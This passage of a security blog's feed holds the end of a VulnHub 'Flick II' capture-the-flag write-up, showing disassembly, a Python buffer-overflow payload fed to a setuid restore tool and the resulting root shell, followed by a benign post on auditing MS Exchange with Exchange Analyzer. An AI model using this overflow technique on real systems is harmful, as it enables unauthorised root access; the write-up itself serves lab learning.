  &lt;span class="nt"&gt;401f65&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;e8&lt;/span&gt; &lt;span class="nt"&gt;b6&lt;/span&gt; &lt;span class="nt"&gt;e2&lt;/span&gt; &lt;span class="nt"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;callq&lt;/span&gt;  &lt;span class="nt"&gt;420220&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;__sigprocmask&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;401f6a&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;8b&lt;/span&gt; &lt;span class="nt"&gt;15&lt;/span&gt; &lt;span class="nt"&gt;ff&lt;/span&gt; &lt;span class="nt"&gt;d7&lt;/span&gt; &lt;span class="nt"&gt;2b&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;    &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="nt"&gt;0x2bd7ff&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rip&lt;/span&gt;&lt;span class="o"&gt;),%&lt;/span&gt;&lt;span class="nt"&gt;rdx&lt;/span&gt;        &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nt"&gt;6bf770&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;__environ&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;401f71&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;8d&lt;/span&gt; &lt;span class="nt"&gt;74&lt;/span&gt; &lt;span class="nt"&gt;24&lt;/span&gt; &lt;span class="nt"&gt;30&lt;/span&gt;          &lt;span class="nt"&gt;lea&lt;/span&gt;    &lt;span class="nt"&gt;0x30&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;),%&lt;/span&gt;&lt;span class="nt"&gt;rsi&lt;/span&gt;
  &lt;span class="nt"&gt;401f76&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;bf&lt;/span&gt; &lt;span class="nt"&gt;20&lt;/span&gt; &lt;span class="nt"&gt;2d&lt;/span&gt; &lt;span class="nt"&gt;49&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x492d20&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;edi&lt;/span&gt;
  &lt;span class="nt"&gt;401f7b&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;c7&lt;/span&gt; &lt;span class="nt"&gt;05&lt;/span&gt; &lt;span class="nt"&gt;bb&lt;/span&gt; &lt;span class="nt"&gt;d4&lt;/span&gt; &lt;span class="nt"&gt;2b&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;    &lt;span class="nt"&gt;movl&lt;/span&gt;   &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x2bd4bb&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rip&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;        &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nt"&gt;6bf440&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;lock&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;401f82&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; 
  &lt;span class="nt"&gt;401f85&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;c7&lt;/span&gt; &lt;span class="nt"&gt;05&lt;/span&gt; &lt;span class="nt"&gt;c1&lt;/span&gt; &lt;span class="nt"&gt;d4&lt;/span&gt; &lt;span class="nt"&gt;2b&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;    &lt;span class="nt"&gt;movl&lt;/span&gt;   &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x0&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x2bd4c1&lt;/span&gt;&lt;span class="o"&gt;(%&lt;/span&gt;&lt;span class="nt"&gt;rip&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;        &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nt"&gt;6bf450&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;sa_refcntr&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;401f8c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; 
  &lt;span class="nt"&gt;401f8f&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;e8&lt;/span&gt; &lt;span class="nt"&gt;9c&lt;/span&gt; &lt;span class="nt"&gt;aa&lt;/span&gt; &lt;span class="nt"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;callq&lt;/span&gt;  &lt;span class="nt"&gt;41ca30&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;__execve&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;401f94&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;bf&lt;/span&gt; &lt;span class="nt"&gt;7f&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0x7f&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;edi&lt;/span&gt;
  &lt;span class="nt"&gt;401f99&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;e8&lt;/span&gt; &lt;span class="nt"&gt;32&lt;/span&gt; &lt;span class="nt"&gt;aa&lt;/span&gt; &lt;span class="nt"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;          &lt;span class="nt"&gt;callq&lt;/span&gt;  &lt;span class="nt"&gt;41c9d0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;_exit&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
  &lt;span class="nt"&gt;401f9e&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;48&lt;/span&gt; &lt;span class="nt"&gt;c7&lt;/span&gt; &lt;span class="nt"&gt;c2&lt;/span&gt; &lt;span class="nt"&gt;c0&lt;/span&gt; &lt;span class="nt"&gt;ff&lt;/span&gt; &lt;span class="nt"&gt;ff&lt;/span&gt; &lt;span class="nt"&gt;ff&lt;/span&gt;    &lt;span class="nt"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;0xffffffffffffffc0&lt;/span&gt;&lt;span class="o"&gt;,%&lt;/span&gt;&lt;span class="nt"&gt;rdx&lt;/span&gt;
  &lt;span class="nt"&gt;401fa5&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;   &lt;span class="nt"&gt;f7&lt;/span&gt; &lt;span class="nt"&gt;d8&lt;/span&gt;                   &lt;span class="nt"&gt;neg&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let us use python to generate the payload encoded in little endian:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[sean@fII storage]$ python -c &amp;#39;print &amp;quot;A&amp;quot;*72 + &amp;quot;\x71\x1f\x40&amp;quot;&amp;#39;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq@
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You may need to use another terminal which would not mess up with your input as
urxvt did. I used tilda for this one. We just need to copy the payload when
choosing the output directory for the restore program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[sean@fII storage]$ /usr/local/bin/restore
/usr/local/bin/restore
Restore tool v0.1
Enter the path to the backup.tar.gz: /tmp/
/tmp/
Path is: /tmp/
Enter the output directory: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq^_@
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq^_@
Output directory is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq@
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And it got us a root shell from where we can get the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[root@fII storage]# id
uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)

root@fII root]# cat flag

  âââââââââ     âââ ââââââ   ââ âââ âââ âââ
âââ   âââââ    ââââââââ ââ   âââââ ââââââââ
âââââ âââââ    âââââââ    â ââââââ ââââââââ
ââââ  âââââ    ââââââââ âââââââ ââ ââââââââ
ââââ   âââââââââââââ âââââ âââââ ââââââââââ
â â   â âââ  âââ  â ââ â  ââ ââ ââââ  ââ  
â     â â â  â â â  â  â   â ââ ââ â â â â
â â     â â    â ââ        â ââ â  â â â â
          â  â â  â â      â  â    â   â  
                  â

You have successfully completed FlickII!

I hope you learnt as much as I did while
making it! Any comments/suggestions etc,
feel free to catch me on freenode in
#vulnhub or on twitter @leonjza
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This was a really great challange! The android part was a really new to me. The
exploitation part was very interesting!.&lt;/p&gt;
&lt;p&gt;Many thanks to TurboSmouem for the challange and as usual thanks to vulnhub.&lt;/p&gt;</content><category term="security"></category><category term="vulnhub"></category><category term="challenge"></category></entry><entry><title>Auditing Exchange Server</title><link href="https://matthieukeller.com/2016/02/auditing-exchange-server.html" rel="alternate"></link><published>2016-02-29T21:49:00+01:00</published><updated>2016-02-29T21:49:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2016-02-29:/2016/02/auditing-exchange-server.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.02/exchange.png" alt="ExchangeAnalyser" width="252"&gt;&lt;/p&gt;
&lt;p&gt;Recently I performed a MS Exchange configuration review. For the "old" version
of exchange we can use the
&lt;a href="https://www.microsoft.com/en-us/download/details.aspx?id=22485"&gt;Microsoft Exchange Best Practices
Analyzer&lt;/a&gt;.
For the new version of MS Exchange (2013 and 2016) the tools must be download
from &lt;a href="https://community.office365.com/en-us/w/deploy/office-365-best-practices-analyzer-for-exchange-server-2013"&gt;the office 365
market&lt;/a&gt;.
But most of the MS Exchange server are not directly connected to internet. That
is why I used a tool developed by Paul Cunningham: &lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer"&gt;Exchange Analyzer available
on github&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.02/exchange.png" alt="ExchangeAnalyser" width="252"&gt;&lt;/p&gt;
&lt;p&gt;Recently I performed a MS Exchange configuration review. For the "old" version
of exchange we can use the
&lt;a href="https://www.microsoft.com/en-us/download/details.aspx?id=22485"&gt;Microsoft Exchange Best Practices
Analyzer&lt;/a&gt;.
For the new version of MS Exchange (2013 and 2016) the tools must be download
from &lt;a href="https://community.office365.com/en-us/w/deploy/office-365-best-practices-analyzer-for-exchange-server-2013"&gt;the office 365
market&lt;/a&gt;.
But most of the MS Exchange server are not directly connected to internet. That
is why I used a tool developed by Paul Cunningham: &lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer"&gt;Exchange Analyzer available
on github&lt;/a&gt;.&lt;/p&gt;


&lt;h2&gt;Getting and installing the script&lt;/h2&gt;
&lt;p&gt;The documentation is clear, you just need to download the last zip archive on
the &lt;a href="http://exchangeserverpro.com/exchangeanalyzer/"&gt;"official website"&lt;/a&gt;,
extract the files, put files in the &lt;code&gt;Modules&lt;/code&gt; folder into
&lt;code&gt;C:\Windows\System32\WindowsPowerShell\V1.0\Modules&lt;/code&gt; and launch the script.&lt;/p&gt;
&lt;h2&gt;Tests&lt;/h2&gt;
&lt;p&gt;There is actually seven tests implemented:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;EXSRV001: checks that all MS Exchange servers in the organization use MS
   Exchange 2013 or 2016.&lt;/li&gt;
&lt;li&gt;EXSRV002: checks the build version of each server to determine whether it is
   running the last build for the MS Exchange version (&lt;em&gt;Internet connection is
   required&lt;/em&gt;).&lt;/li&gt;
&lt;li&gt;CAS001: tests each Exchange site to determine whether more than one CAS URL/namespace
   exists for each HTTPS service.&lt;/li&gt;
&lt;li&gt;CAS002: tests each CAS URL to determine whether it contains a server FQDN.&lt;/li&gt;
&lt;li&gt;DB001: tests each mailbox database to determine whether the database has been
   backed up in the last 24 hours.&lt;/li&gt;
&lt;li&gt;AD001: verifies that the Active Directory Domain level is at the correct
   level.&lt;/li&gt;
&lt;li&gt;AD002: verifies that the Active Directory Forest level is Windows 2008 or
   greater.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;More tests will come in a quite near future as both
&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/pulls"&gt;pull requests&lt;/a&gt; and
&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/issues"&gt;issues&lt;/a&gt; are currently
open on github.&lt;/p&gt;
&lt;h2&gt;Results&lt;/h2&gt;
&lt;p&gt;The result is simple, it is a HTML file with the different tests and a past or
fail attribute. The script need an internet connection to check the latest build
number. As there where no direct access to the internet from the MS Exchange
servers of my client, the test failed with a Warning and output the error
message: "Unable to connect to remote server".
Moreover my client did not wish to backup its databases so the test DB001
failed.&lt;/p&gt;
&lt;p&gt;Below is a sample of this output, I have just anonymize it and reduce the
number of server.&lt;/p&gt;
&lt;h2&gt;Output&lt;/h2&gt;
&lt;p&gt;&lt;html&gt;
      &lt;style&gt;
      BODY{font-family: Arial; font-size: 10pt;}
      H1{font-size: 22px;}
      H2{font-size: 20px; padding-top: 10px;}
      H3{font-size: 16px; padding-top: 8px;}
      TABLE{border: 1px solid black; border-collapse: collapse; font-size: 8pt;}
      TH{border: 1px solid black; background: #dddddd; padding: 5px; color: #000000;}
      TD{border: 1px solid black; padding: 5px; }
      td.pass{background: #7FFF00;}
      td.warn{background: #FFE600;}
      td.fail{background: #FF0000; color: #ffffff;}
      td.info{background: #85D4FF;}
            ul{list-style: inside; padding-left: 0px;}
      &lt;/style&gt;
      &lt;body&gt;&lt;h1 align="center"&gt;Exchange Analyzer Report&lt;/h1&gt;
      &lt;h3 align="center"&gt;Generated: 02/18/2016 11:38:42&lt;/h3&gt;
            &lt;h3 align="center"&gt;Organization: CLIENT&lt;/h3&gt;
            &lt;p&gt;The following guidelines apply to this report:
            &lt;ul&gt;
                &lt;li&gt;This tests included in this report are documented on the &lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/Exchange-Analyzer-Tests"&gt;Exchange Analyzer Wiki&lt;/a&gt;.&lt;/li&gt;
                &lt;li&gt;Click the "More Info" link for each test to learn more about that test, what a pass or fail means, and recommendations for how to respond.&lt;/li&gt;
                &lt;li&gt;A test can fail if it can't complete successfully, or if a condition was encountered that requires manual assessment.&lt;/li&gt;
                &lt;li&gt;For some organizations a failed test may be due to a deliberate design or operational decision.&lt;/li&gt;
                &lt;li&gt;Please review the &lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/Frequently-Asked-Questions"&gt;Frequently Asked Questions&lt;/a&gt; if you have any further questions.&lt;/li&gt;
            &lt;/ul&gt;
            &lt;/p&gt;&lt;h2 align="center"&gt;Summary:&lt;/h2&gt;
                      &lt;p align="center"&gt;
                      &lt;table&gt;
                      &lt;tr&gt;
                      &lt;th&gt;Passed&lt;/th&gt;
                      &lt;th&gt;Warning&lt;/th&gt;
                      &lt;th&gt;Failed&lt;/th&gt;
                      &lt;th&gt;Info&lt;/th&gt;
                      &lt;/tr&gt;
                      &lt;tr&gt;
                      &lt;td class="pass"&gt;4&lt;/td&gt;
                      &lt;td class="warn"&gt;1&lt;/td&gt;
                      &lt;td class="fail"&gt;2&lt;/td&gt;
                      &lt;td class="info"&gt;0&lt;/td&gt;
                      &lt;/tr&gt;
                      &lt;/table&gt;
                      &lt;/p&gt;&lt;h2&gt;Category: Exchange Servers&lt;/h2&gt;&lt;p&gt;
                  &lt;table&gt;
                  &lt;tr&gt;
                  &lt;th&gt;Test ID&lt;/th&gt;
                  &lt;th&gt;Test Category&lt;/th&gt;
                  &lt;th&gt;Test Name&lt;/th&gt;
                  &lt;th&gt;Test Outcome&lt;/th&gt;
                  &lt;th&gt;Passed Objects&lt;/th&gt;
                  &lt;th&gt;Failed Objects&lt;/th&gt;
                  &lt;th&gt;Comments&lt;/th&gt;
                  &lt;th&gt;Reference&lt;/th&gt;
                  &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;EXSRV001&lt;/td&gt;&lt;td&gt;Exchange Servers&lt;/td&gt;&lt;td&gt;Exchange Versions&lt;/td&gt;&lt;td class="pass"&gt;Passed&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;WindowsServer1&lt;/li&gt;&lt;li&gt;WindowsServer2&lt;/li&gt;&lt;li&gt;WindowsServer3&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;All Exchange servers in the organization are Exchange 2013/2016.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/EXSRV001" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;tr&gt;&lt;td&gt;EXSRV002&lt;/td&gt;&lt;td&gt;Exchange Servers&lt;/td&gt;&lt;td&gt;Build Numbers&lt;/td&gt;&lt;td class="warn"&gt;Warning&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;Errors were encountered. An error occurred. Unable to connect to remote server&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/EXSRV002" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;/table&gt;&lt;/p&gt;&lt;h2&gt;Category: Client Access&lt;/h2&gt;&lt;p&gt;Summary of Client Access URLs/Namespaces:&lt;/p&gt;&lt;table&gt;
                            &lt;tr&gt;
                            &lt;th colspan="3"&gt;Server: WindowsServer1, Site: &lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;th&gt;Service&lt;/th&gt;
                            &lt;th&gt;Internal URL&lt;/th&gt;
                            &lt;th&gt;External Url&lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook Anywhere&lt;/td&gt;
                            &lt;td&gt;outlook-csh-ge.client.com&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;MAPI/HTTP&lt;/td&gt;
                            &lt;td&gt;https://windowsserver1.client.local/mapi&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook on the web (OWA)&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/OWA https://mail.client.com/OWA&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Control Panel&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/ecp https://mail.client.com/ecp&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;ActiveSync&lt;/td&gt;
                            &lt;td&gt;https://eas.client.com/Microsoft-Server-ActiveSync&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Offline Address Book&lt;/td&gt;
                            &lt;td&gt;https://oab-csh-ge.client.com/OAB&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Web Access&lt;/td&gt;
                            &lt;td&gt;https://ews-csh-ge.client.com/EWS/Exchange.asmx&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;AutoDiscover&lt;/td&gt;
                            &lt;td&gt;https://autodiscover-csh-ge.client.com/autodiscover/autodiscover.xml&lt;/td&gt;
                            &lt;td&gt;n/a&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;/table&gt;
                            &lt;/p&gt;&lt;table&gt;
                            &lt;tr&gt;
                            &lt;th colspan="3"&gt;Server: WindowsServer2, Site: &lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;th&gt;Service&lt;/th&gt;
                            &lt;th&gt;Internal URL&lt;/th&gt;
                            &lt;th&gt;External Url&lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook Anywhere&lt;/td&gt;
                            &lt;td&gt;outlook-csh-ge.client.com&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;MAPI/HTTP&lt;/td&gt;
                            &lt;td&gt;https://windowsserver2.client.local/mapi&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook on the web (OWA)&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/OWA https://mail.client.com/OWA&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Control Panel&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/ecp https://mail.client.com/ecp&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;ActiveSync&lt;/td&gt;
                            &lt;td&gt;https://eas.client.com/Microsoft-Server-ActiveSync&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Offline Address Book&lt;/td&gt;
                            &lt;td&gt;https://oab-csh-ge.client.com/OAB&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Web Access&lt;/td&gt;
                            &lt;td&gt;https://ews-csh-ge.client.com/EWS/Exchange.asmx&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;AutoDiscover&lt;/td&gt;
                            &lt;td&gt;https://autodiscover-csh-ge.client.com/autodiscover/autodiscover.xml&lt;/td&gt;
                            &lt;td&gt;n/a&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;/table&gt;
                            &lt;/p&gt;&lt;table&gt;
                            &lt;tr&gt;
                            &lt;th colspan="3"&gt;Server: WindowsServer3, Site: &lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;th&gt;Service&lt;/th&gt;
                            &lt;th&gt;Internal URL&lt;/th&gt;
                            &lt;th&gt;External Url&lt;/th&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook Anywhere&lt;/td&gt;
                            &lt;td&gt;outlook-csh-ge.client.com&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;MAPI/HTTP&lt;/td&gt;
                            &lt;td&gt;https://windowsserver3.client.local/mapi&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Outlook on the web (OWA)&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/OWA https://mail.client.com/OWA&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Control Panel&lt;/td&gt;
                            &lt;td&gt;https://mail.client.com/ecp https://mail.client.com/ecp&lt;/td&gt;
                            &lt;td&gt; &lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;ActiveSync&lt;/td&gt;
                            &lt;td&gt;https://eas.client.com/Microsoft-Server-ActiveSync&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Offline Address Book&lt;/td&gt;
                            &lt;td&gt;https://oab-csh-ge.client.com/OAB&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;Exchange Web Access&lt;/td&gt;
                            &lt;td&gt;https://ews-csh-ge.client.com/EWS/Exchange.asmx&lt;/td&gt;
                            &lt;td&gt;Not set&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;tr&gt;
                            &lt;td&gt;AutoDiscover&lt;/td&gt;
                            &lt;td&gt;https://autodiscover-csh-ge.client.com/autodiscover/autodiscover.xml&lt;/td&gt;
                            &lt;td&gt;n/a&lt;/td&gt;
                            &lt;/tr&gt;
                            &lt;/table&gt;
                            &lt;/p&gt;&lt;p&gt;
                  &lt;table&gt;
                  &lt;tr&gt;
                  &lt;th&gt;Test ID&lt;/th&gt;
                  &lt;th&gt;Test Category&lt;/th&gt;
                  &lt;th&gt;Test Name&lt;/th&gt;
                  &lt;th&gt;Test Outcome&lt;/th&gt;
                  &lt;th&gt;Passed Objects&lt;/th&gt;
                  &lt;th&gt;Failed Objects&lt;/th&gt;
                  &lt;th&gt;Comments&lt;/th&gt;
                  &lt;th&gt;Reference&lt;/th&gt;
